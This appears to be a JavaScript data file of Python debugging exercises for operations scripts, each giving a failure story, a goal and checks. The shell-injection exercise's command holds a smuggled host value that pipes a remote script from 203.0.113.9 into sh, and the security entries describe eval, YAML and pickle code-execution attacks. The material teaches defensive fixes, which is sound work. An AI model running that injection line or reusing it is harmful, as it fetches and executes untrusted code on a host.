window.TRACK_SCENARIOS = [
  {"id":"indent","group":"Basics","level":"01","title":"IndentationError","story":"A colleague added a log line to the nightly clean-up job from their phone. Since then the job fails before it deletes anything, and the upload disk is filling up.","goal":"Delete the scratch files older than 14 days, and keep the recent ones.","file":"cleanup_tmp.py","cmd":"python3 cleanup_tmp.py","checks":["Files older than 14 days are removed","Recent files are kept"]},
  {"id":"none","group":"Basics","level":"01","title":"'NoneType' object is not subscriptable","story":"The on-call runbook says to look up a host's address with lookup.py. Tonight it crashes for db-old, a server that was retired last week, and prints nothing useful.","goal":"Print the addresses it can find, and say clearly which host is not in the inventory, without a traceback.","file":"lookup.py","cmd":"python3 lookup.py web-01 web-02 db-old","checks":["No traceback","The missing host is reported, not skipped silently"]},
  {"id":"keyerror","group":"Basics","level":"01","title":"KeyError on optional data","story":"The quarterly access review needs every account in the identity export. The script stops at account 37 with a KeyError. That account is ci-deploy, a service account with no email address.","goal":"List all 120 accounts, showing a dash when an account has no email.","file":"list_accounts.py","cmd":"python3 list_accounts.py","checks":["No traceback","All 120 accounts are listed"]},
  {"id":"mutable","group":"Basics","level":"02","title":"Tags leak between hosts","story":"The firewall audit flags db-01 as internet-facing. It is not: the tags come from a helper that remembers every tag it has ever added.","goal":"Give each host only its own tags.","file":"tag_hosts.py","cmd":"python3 tag_hosts.py","checks":["db-01 is not tagged internet-facing","build-01 gets only env:ci"]},
  {"id":"argparse","group":"Basics","level":"05","title":"Deploys to None","story":"Someone ran the deploy script without --env. It printed \"Deploying 2.4.1 to None\" and then crashed inside subprocess. Next time it might not crash.","goal":"Refuse to run without --env, with a usage message, and never pick an environment on the user's behalf.","file":"deploy.py","cmd":"python3 deploy.py --version 2.4.1","checks":["Refuses to deploy without --env","Prints the usage and exits with status 2"]},
  {"id":"envtype","group":"Basics","level":"05","title":"'>' not supported for str","story":"The disk alert worked for months with its default of 90%. The database team set DISK_ALERT_PERCENT=80 for their servers, and now the check crashes there every five minutes instead of alerting.","goal":"Use the threshold from the environment when it is set, and 90 otherwise. /var is 86% full.","file":"disk_alert.py","cmd":"python3 disk_alert.py && DISK_ALERT_PERCENT=80 python3 disk_alert.py","checks":["Works without DISK_ALERT_PERCENT","Alerts at 86% with DISK_ALERT_PERCENT=80"]},
  {"id":"pathjoin","group":"Files and paths","level":"03","title":"Path glued together","story":"The archive step works on nobody's machine. On ops-01 it tries to write /srv/archive2026-10-30.zip and is refused; on the Windows build agent, whose ARCHIVE_DIR is D:\\Build Archive, the zip lands in the root of D: with a strange name.","goal":"Put the archive inside ARCHIVE_DIR on both machines, keeping ARCHIVE_DIR configurable.","file":"archive_build.py","cmd":"python3 archive_build.py   # on ops-01, and on the Windows build agent","checks":["ops-01: the zip lands in /srv/archive/","Windows agent: the zip lands in D:\\Build Archive\\"]},
  {"id":"bigfile","group":"Files and paths","level":"03","title":"Killed: the 10 GB log","story":"During the outage the incident lead asked how many 5xx errors there were. The script ran for a minute, the server slowed to a crawl, and the shell printed one word: Killed.","goal":"Count the 5xx responses in the 10 GB log on a server with 4 GB of memory.","file":"count_5xx.py","cmd":"python3 count_5xx.py /var/log/nginx/access.log   # 10.4 GB, on a 4 GB server","checks":["Finishes without running out of memory","Prints the count for each 5xx status"]},
  {"id":"unicode","group":"Files and paths","level":"03","title":"UnicodeDecodeError","story":"Finance exports the customer list from an old Windows system every night. The import script fails on the first accented name, and today's new customers are missing from the shop.","goal":"Read the whole export with every name intact. The file is in Windows-1252 (cp1252).","file":"import_customers.py","cmd":"python3 import_customers.py","checks":["Reads the whole file","Names keep their accents"]},
  {"id":"cwd","group":"Files and paths","level":"03","title":"Works by hand, fails in cron","story":"The disk watcher works every time you run it from its folder. From cron it fails within a second, every ten minutes, and nobody gets the disk alerts.","goal":"Find config.json next to the script, wherever it is run from.","file":"diskwatch/diskwatch.py","cmd":"cd ~ && python3 diskwatch/diskwatch.py   # what cron does","checks":["Finds config.json from any working directory","Reports every mount"]},
  {"id":"flush","group":"Files and paths","level":"03","title":"The empty report","story":"The weekly disk report arrives by email every Monday as an empty attachment. The script says it wrote the file, and it did: before the rows reached the disk.","goal":"Make the compressed report contain the header and every row.","file":"disk_report.py","cmd":"python3 disk_report.py && zcat disk_report.csv.gz","checks":["The compressed report contains every row"]},
  {"id":"symlinks","group":"Files and paths","level":"03","title":"Too many levels of symbolic links","story":"The capacity report for the shared drive crashes. Someone added /srv/shared/projects/current, a symlink to its own parent, so the newest project is easy to find.","goal":"Total the shared drive without following symlinks into a loop.","file":"share_size.py","cmd":"python3 share_size.py","checks":["No traceback","Prints the total size"]},
  {"id":"shellinj","group":"Processes and subprocess","level":"04","title":"Shell injection","story":"The chat bot lets anyone in the ops channel ask whether a host is up. A penetration tester typed a host name with a semicolon in it, and the bot ran their script on the jump host.","goal":"Ping exactly the host that was typed, and never run anything else it contains.","file":"ping_bot.py","cmd":"python3 ping_bot.py web-01 && python3 ping_bot.py \"web-01; curl -s http://203.0.113.9/x.sh | sh\"","checks":["web-01 is reported up","Text after the ; is never run"]},
  {"id":"checktrue","group":"Processes and subprocess","level":"04","title":"Backup complete (it was not)","story":"The database password was rotated on Friday. Every nightly backup since has printed \"Backup complete\" and exited 0. Nobody noticed until a restore was needed.","goal":"Stop at the first failing command and exit non-zero, so cron and monitoring see the failure.","file":"backup_db.py","cmd":"python3 backup_db.py","checks":["Stops when pg_dump fails","Exits non-zero"]},
  {"id":"hang","group":"Processes and subprocess","level":"04","title":"One host hangs the whole run","story":"The morning disk report never arrived. nfs-01 has a stuck NFS mount: ssh connects fine, but df on that host waits for the mount for ever, and so does the script.","goal":"Give each host 30 seconds, report the one that does not answer, and still check the rest.","file":"fleet_df.py","cmd":"python3 fleet_df.py","checks":["The run finishes","nfs-01 is reported and db-01 is still checked"]},
  {"id":"bytes","group":"Processes and subprocess","level":"04","title":"The alert that never fires","story":"/var/log filled up overnight and the app stopped writing. The disk check ran every five minutes and said nothing. It has never alerted, on any server.","goal":"Alert for every mount at 100%, naming the mount point as plain text. /var/log is full.","file":"disk_full.py","cmd":"python3 disk_full.py","checks":["Alerts for /var/log","Prints the mount point as text"]},
  {"id":"cronpath","group":"Processes and subprocess","level":"04","title":"No such file: 'kubectl'","story":"The failed-Pod report runs perfectly in your terminal. From cron it has failed every hour since it was installed, because cron's PATH is only /usr/bin:/bin and kubectl lives in /usr/local/bin.","goal":"Find kubectl when run from cron, and list the failed Pods.","file":"failed_pods.py","cmd":"env -i PATH=/usr/bin:/bin python3 failed_pods.py   # cron's environment","checks":["Finds kubectl under cron's PATH","Lists the failed Pods"]},
  {"id":"timeout","group":"HTTP and APIs","level":"07","title":"Hangs for ever","story":"The status API accepted the connection and then stopped answering. The health check that should have paged someone sat waiting all night, and so did the six copies cron started after it.","goal":"Finish within a minute whatever the API does, and report it as DOWN with exit status 2.","file":"status_check.py","cmd":"python3 status_check.py","checks":["Finishes within a minute","Reports DOWN and exits 2"]},
  {"id":"jsonhtml","group":"HTTP and APIs","level":"07","title":"JSONDecodeError on an error page","story":"During a gateway outage the incident dashboard script failed with \"Expecting value: line 1 column 1\". The API had answered 502 with an HTML error page, and the script tried to read it as JSON.","goal":"When the API fails, say which HTTP status it returned. Never report 0 open incidents because the API was down.","file":"open_incidents.py","cmd":"python3 open_incidents.py","checks":["The error names the HTTP status","Never reports 0 open incidents on failure"]},
  {"id":"backoff","group":"HTTP and APIs","level":"07","title":"Retries take the API down","story":"The config API had a two-minute blip at midnight. 400 hosts retried in a tight loop, turned the blip into an hour-long outage, and the API team blocked the shared token for abuse.","goal":"Retry a few times, waiting longer after each failure, with random jitter so the hosts spread out. Give up with an error in the end.","file":"fetch_config.py","cmd":"python3 fetch_config.py   # on 400 hosts, from cron at :00","checks":["Gives up after a limited number of attempts","Waits longer after each failure","Adds random jitter"]},
  {"id":"verify","group":"HTTP and APIs","level":"07","title":"CERTIFICATE_VERIFY_FAILED","story":"Vault uses a certificate from the company's internal CA. Months ago someone made the error go away with verify=False. The security review found it: anyone on the network path could have answered instead of Vault.","goal":"Verify Vault's certificate against the company CA bundle at /etc/ssl/certs/corp-root-ca.pem, and still read the health status.","file":"vault_health.py","cmd":"python3 vault_health.py","checks":["The TLS certificate is verified","Reads the health status"]},
  {"id":"pagination","group":"HTTP and APIs","level":"07","title":"Only the first 100","story":"The audit asked for every Git account with no activity since July. The script reported 100 users checked. The company has 342, and the auditor found the leaver's account the script never saw.","goal":"Check every user, following the API's pages to the end.","file":"inactive_users.py","cmd":"python3 inactive_users.py","checks":["Checks all 342 users"]},
  {"id":"tz","group":"Data formats","level":"06","title":"Naive and aware datetimes","story":"The certificate API returns expiry times in UTC with an offset. The script that should page about certificates expiring within six hours crashes, and the shop's certificate expires at 02:00 UTC tonight.","goal":"Flag shop.example.com, which expires in 3.5 hours, on a server whose local time zone is New York.","file":"cert_deadline.py","cmd":"TZ=America/New_York python3 cert_deadline.py   # 18:30 local, 22:30 UTC","checks":["No traceback","Flags the certificate that expires in 3.5 hours"]},
  {"id":"jsondump","group":"Data formats","level":"06","title":"Not JSON serializable","story":"A timestamp was added to the nightly report so the dashboard can show its age. The report has not been written since.","goal":"Write report.json as valid JSON with the timestamp as ISO 8601 text.","file":"write_report.py","cmd":"python3 write_report.py && python3 -m json.tool report.json","checks":["Writes report.json","The file is valid JSON with an ISO 8601 timestamp"]},
  {"id":"csvsplit","group":"Data formats","level":"06","title":"too many values to unpack","story":"The host list is a CSV exported from the asset database. It loaded fine until a team called \"Payments, EU\" took over db-02; the quotes around the comma are valid CSV, but the script splits on every comma.","goal":"Load all 58 hosts, with owner names that contain commas kept whole.","file":"load_hosts.py","cmd":"python3 load_hosts.py","checks":["Loads all 58 hosts","\"Payments, EU\" stays one owner"]},
  {"id":"badline","group":"Errors and logging","level":"08","title":"One bad line stops the report","story":"The log was rotated while nginx was writing, and one line was cut in half. The latency report now dies at line 48,211 of 1.2 million, every time.","goal":"Skip lines that cannot be parsed, count how many were skipped, and report on the rest. Do not hide other kinds of bugs.","file":"slow_requests.py","cmd":"python3 slow_requests.py access.log","checks":["Reads past the bad lines","Says how many lines were skipped","Catches only the parsing errors"]},
  {"id":"logdup","group":"Errors and logging","level":"08","title":"Every log line, many times","story":"The rotation job's log grows faster than the logs it rotates: the first message appears once, the second twice, the third three times, and so on through the night.","goal":"Log each message exactly once.","file":"rotate.py","cmd":"python3 rotate.py","checks":["Each message is logged once"]},
  {"id":"loglevel","group":"Errors and logging","level":"08","title":"logging.info prints nothing","story":"The team thought the /var check had stopped running: its log file has been empty for weeks. It runs every hour. Its info messages simply go nowhere.","goal":"Write the INFO line, with a timestamp, to the cron log on every run.","file":"var_check.py","cmd":"python3 var_check.py >> /var/log/var_check.log 2>&1   # from cron","checks":["The INFO line appears in the log"]},
  {"id":"bareexcept","group":"Errors and logging","level":"08","title":"A bare except swallows the exit","story":"Version 2.4.1 failed its health check after the traffic switch. The script printed that it was rolling back, then that the release was live, and exited 0. The pipeline marked the release green.","goal":"When the health check fails, stop with exit status 1 and do not claim the release is live.","file":"release.py","cmd":"python3 release.py 2.4.1","checks":["Exits 1 when the health check fails","Does not say the release is live"]},
  {"id":"exitzero","group":"Testing and CI","level":"11","title":"Exit status 0, so CI passes","story":"A release broke the API. The smoke test printed FAIL for /api/healthz, the pipeline step stayed green, and the release went on to production.","goal":"Make the pipeline step fail whenever an endpoint fails.","file":"smoke_test.py","cmd":"python3 smoke_test.py   # the pipeline's smoke-test step","checks":["The CI step fails when an endpoint fails"]},
  {"id":"cimock","group":"Testing and CI","level":"11","title":"The test needs production","story":"The unit test passes on every laptop and fails on every CI run. It calls the real shop: from the office it is reachable, from the CI runner it is not.","goal":"Test that check() reports UP for a 200 answer, without the network, so the test passes anywhere.","file":"test_monitor.py","cmd":"python3 -m unittest test_monitor   # on the CI runner, which cannot reach shop.internal","checks":["Passes on a runner with no network","Really tests the UP case"]},
  {"id":"pool","group":"Concurrency","level":"09","title":"Too many clients already","story":"Someone made the store report faster with 200 threads. Each thread opened its own database connection; the database allows 100, the shop already uses 85, and checkout started failing with \"too many clients\".","goal":"Use at most 15 connections at a time and still finish within the 15-minute cron interval. Each store's query takes 30 seconds; there are 40 stores.","file":"store_report.py","cmd":"python3 store_report.py   # every 15 minutes, on a 16-CPU host","checks":["Stays within the 15 free connections","Finishes within 15 minutes"]},
  {"id":"gil","group":"Concurrency","level":"09","title":"16 threads, one busy core","story":"Scanning sixteen days of logs takes 41 minutes, with or without the thread pool someone added. top shows python3 at 100% CPU: one core out of sixteen.","goal":"Use all the CPUs and finish in under 10 minutes.","file":"scan_logs.py","cmd":"python3 scan_logs.py /var/log/nginx/access.log.{1..16}   # 16 files of 2 GB, 16 CPUs","checks":["Uses more than one CPU core","Finishes in under 10 minutes"]},
  {"id":"futures","group":"Concurrency","level":"09","title":"Lost exceptions in futures","story":"The parallel restart said \"restarted on all hosts\" and exited 0. web-03 had failed: the unit was renamed there last month. The error sat in a Future that nobody looked at.","goal":"Report the failure on web-03 and exit non-zero.","file":"restart_fleet.py","cmd":"python3 restart_fleet.py","checks":["The failure on web-03 is reported","Exits non-zero"]},
  {"id":"asyncblock","group":"Concurrency","level":"09","title":"time.sleep inside async code","story":"The SSH port sweep of 200 addresses was rewritten with asyncio to take seconds. It takes over a minute: one polite pause, added after each closed port, freezes everything.","goal":"Keep the one-second pause after a closed port without blocking the other checks. The sweep should take about 4 seconds.","file":"port_sweep.py","cmd":"time python3 port_sweep.py","checks":["Finishes in about 4 seconds","The pause really waits (no 'never awaited' warning)"]},
  {"id":"cronvenv","group":"Packaging and environments","level":"10","title":"Cron uses the wrong Python","story":"The monitor works when you run it by hand, inside its virtual environment. Its cron job has written the same traceback to /var/log/monitor.log every five minutes since it was installed.","goal":"Run check.py with the Python from /opt/monitor/.venv, keeping the log redirection.","file":"crontab","cmd":"crontab -l   # cron runs each line with /bin/sh, outside your virtual environment","checks":["The job finds requests (the venv's Python)","Output still goes to /var/log/monitor.log"]},
  {"id":"pep668","group":"Packaging and environments","level":"10","title":"externally-managed-environment","story":"The new servers run a current Ubuntu. The deploy script that installed the monitor's packages on the old ones now stops at pip with a long error about an externally managed environment.","goal":"Install the requirements into a virtual environment in /opt/monitor/.venv and run check.py with it. Leave the system Python alone.","file":"deploy.sh","cmd":"sh deploy.sh   # on the new Ubuntu servers","checks":["Installs the requirements","Leaves the system Python untouched","Runs check.py with the venv's Python"]},
  {"id":"pinning","group":"Packaging and environments","level":"10","title":"An unpinned dependency breaks the deploy","story":"Nothing in the monitor changed, yet today's deploy fails on start-up. A new major version of urllib3 came out; the code uses an argument it removed. Yesterday's servers still run the old one.","goal":"Make every deploy install exactly the versions the code was tested with: requests 2.31.0, urllib3 1.26.20, certifi 2024.8.30, idna 3.10, charset-normalizer 3.4.0.","file":"requirements.txt","cmd":"pip install -r requirements.txt && python check.py   # a fresh deploy, today","checks":["Every package, dependencies too, is pinned with ==","Installs the urllib3 the code was tested with"]},
  {"id":"pkgname","group":"Packaging and environments","level":"10","title":"No matching distribution for yaml","story":"A new script needs `import yaml`, so someone added yaml to requirements.txt. The pipeline now fails at the install step on every branch.","goal":"Install the package that provides the yaml module, pinned to 6.0.2.","file":"requirements.txt","cmd":"pip install -r requirements.txt","checks":["pip installs every requirement","import yaml works"]},
  {"id":"secretlog","group":"Security","level":"12","title":"Token printed in the CI log","story":"The deploy token turned up in a public CI log. Debug logging had been switched on to chase a flaky step, and one debug line printed the request headers, Authorization included.","goal":"Keep the debug logging, but never write the token or the headers to the output.","file":"create_release.py","cmd":"LOG_LEVEL=DEBUG python3 create_release.py   # how the pipeline runs it","checks":["The token never appears in the output","The release is still logged","No log or print call includes the headers or the token"]},
  {"id":"hardcoded","group":"Security","level":"12","title":"A key committed to the repository","story":"The secret scanner in CI blocks the merge: the paging script has its API key written into the source. The author wants to merge today.","goal":"Read the key from the ONCALL_API_KEY environment variable so no credential is left in the code.","file":"page_oncall.py","cmd":"python3 scripts/secret_scanner.py page_oncall.py   # the CI gate, then the script itself","checks":["The secret scanner passes","No credential left in the source","The key is read from the environment"]},
  {"id":"yamlunsafe","group":"Security","level":"12","title":"yaml.load runs code","story":"After a PyYAML upgrade the deploy runner failed with a TypeError, and the quick fix suggested in a forum was Loader=yaml.Loader. Pull request #482, from a fork, changes deploy.yml.","goal":"Load deploy.yml as plain data: the normal file deploys, and the tag in pull request #482 is rejected instead of run.","file":"apply_steps.py","cmd":"python3 apply_steps.py   # with deploy.yml from main, then from pull request #482","checks":["Loads the normal deploy.yml","The pull request's payload never runs"]},
  {"id":"evalinput","group":"Security","level":"12","title":"eval on a setting","story":"The job reads its numeric settings with eval. Anyone who can edit CI variables can change TIMEOUT, and someone set it to a line of Python that sent the job's environment, secrets included, to their server.","goal":"Read MAX_RETRIES as an int and TIMEOUT as a float, so a setting can never run code.","file":"job_settings.py","cmd":"python3 job_settings.py   # with normal settings, then with TIMEOUT changed in the CI settings page","checks":["Reads normal values (3 and 10)","The TIMEOUT payload never runs"]},
  {"id":"pickle","group":"Security","level":"12","title":"Unpickling a shared cache","story":"A root cron job caches the host inventory in /tmp with pickle. Any user on the box can write to /tmp, and unpickling a file runs whatever code its author put in it.","goal":"Cache the inventory in a format that cannot run code, in a directory only the job's own user can write.","file":"inventory_cache.py","cmd":"python3 inventory_cache.py   # from root's crontab","checks":["The cache format cannot run code","The cache is not in a directory other users can write"]},
  {"id":"cache","group":"Production","level":"13","title":"Memory grows until the OOM killer","story":"The log enricher adds the owning team to every request. It was cached so the IP address service would survive the traffic, and now the enricher itself is OOM-killed every four days: every IP on the internet ends up in the cache.","goal":"Keep memory bounded and keep the IP service under 2,000 requests per second. The traffic is 18,000 lines per second; most come from a few hundred thousand addresses.","file":"enrich.py","cmd":"tail -F /var/log/nginx/access.log | python3 enrich.py   # a long-running service","checks":["Memory stays bounded","The IP service gets under 2,000 requests per second"]},
  {"id":"distutils","group":"Production","level":"13","title":"No module named 'distutils'","story":"The OS upgrade brought Python 3.13, and the pre-flight version check stopped working: distutils was removed from the standard library in Python 3.12. The venv has only the standard library.","goal":"Compare versions without distutils, so 1.10.2 and 2.0.0 pass and 1.8.9 is too old.","file":"check_versions.py","cmd":"python3 check_versions.py 1.10.2 1.8.9 2.0.0   # after the server upgrade to Python 3.13","checks":["Runs on Python 3.12 and later","1.10.2 counts as newer than 1.9.0"]},
  {"id":"sigterm","group":"Production","level":"13","title":"Killed mid-job on every deploy","story":"Every deploy of the order worker sends some customers two confirmation emails. Kubernetes stops the old Pod with SIGTERM, Python dies at once by default, and the job it was half-way through runs again on the new Pod.","goal":"On SIGTERM, finish the current job, then exit 0 within the 30-second grace period.","file":"worker.py","cmd":"python3 worker.py   # in a Kubernetes Pod; a rollout sends SIGTERM, then SIGKILL after 30 s","checks":["Finishes the current job before exiting","Exits 0 within the grace period"]},
  {"id":"atomic","group":"Production","level":"13","title":"Readers see a half-written file","story":"Each time feature flags are published, checkout fails for a moment with HTTP 500. The shop re-reads the flags file every second, and sometimes reads it after open() emptied it and before json.dump finished.","goal":"Replace the flags file in one step, so readers see either the old file or the new one, never a partial one.","file":"publish_flags.py","cmd":"python3 publish_flags.py   # the shop re-reads /etc/shop/flags.json every second","checks":["Readers never see a half-written file","The new flags are published"]},
  {"id":"awsregion","group":"AWS and boto3","level":"14","title":"NoRegionError under cron","story":"The weekly report of unattached EBS volumes works when you run it. From cron it has failed every Monday since it was added, and the volumes it should have reported cost money every day.","goal":"Make the script work without a region in the environment, while still letting AWS_REGION choose one.","file":"ebs_report.py","cmd":"python3 ebs_report.py   # from cron: no ~/.bashrc, so no AWS_REGION","checks":["No NoRegionError under cron","Reports the unattached volumes"]},
  {"id":"awsretry","group":"AWS and boto3","level":"14","title":"Throttling: reached max retries","story":"The FinOps report looks for instances that peaked under 10% CPU in two weeks. With 412 instances and 32 threads it dies after a few seconds with a Throttling error, every time.","goal":"Let the report finish for all 412 instances, without dropping any of them.","file":"idle_report.py","cmd":"python3 idle_report.py   # 412 instances, 32 threads","checks":["The run finishes without a Throttling error","Every instance is checked; none is skipped"]},
  {"id":"awspager","group":"AWS and boto3","level":"15","title":"Exactly 1,000 objects","story":"Storage for order exports is growing by a terabyte a month, but the script that sizes the orders/ prefix says 1000 objects and 12.7 GB, the same number every week.","goal":"Count and size every object under orders/, all 48,213 of them.","file":"export_size.py","cmd":"EXPORT_BUCKET=shop-exports python3 export_size.py","checks":["Counts all 48,213 objects"]},
  {"id":"awsdryrun","group":"AWS and boto3","level":"16","title":"A clean-up with no dry run","story":"Someone ran the clean-up script to see which unattached volumes it would remove. It removed them, including a 500 GiB data volume the DBA had detached an hour earlier for a resize.","goal":"Without --apply, only list what would be deleted, and let EC2 check the permission with DryRun=True. With --apply, delete.","file":"delete_unattached.py","cmd":"python3 delete_unattached.py --region eu-west-1   # \"I only wanted to see the list\"","checks":["Without --apply, nothing is deleted","With --apply, the volumes are deleted","The dry run asks EC2 (DryRun=True), so a missing permission shows first"]},
  {"id":"piilog","group":"Personal data","level":"17","title":"Aadhaar numbers in the log","story":"The personal-data scanner in CI flagged the KYC service's sample logs: every verification writes the customer's whole record, Aadhaar number and phone included, and those logs go to a third-party platform.","goal":"Keep a log line per verification, with the customer id, and no personal data at all.","file":"kyc_check.py","cmd":"python3 kyc_check.py   # logs are shipped to the log platform and kept 400 days","checks":["No personal data in the log output","Each verification is still logged with the customer id","No log call is given the whole record or a personal field"]}
];
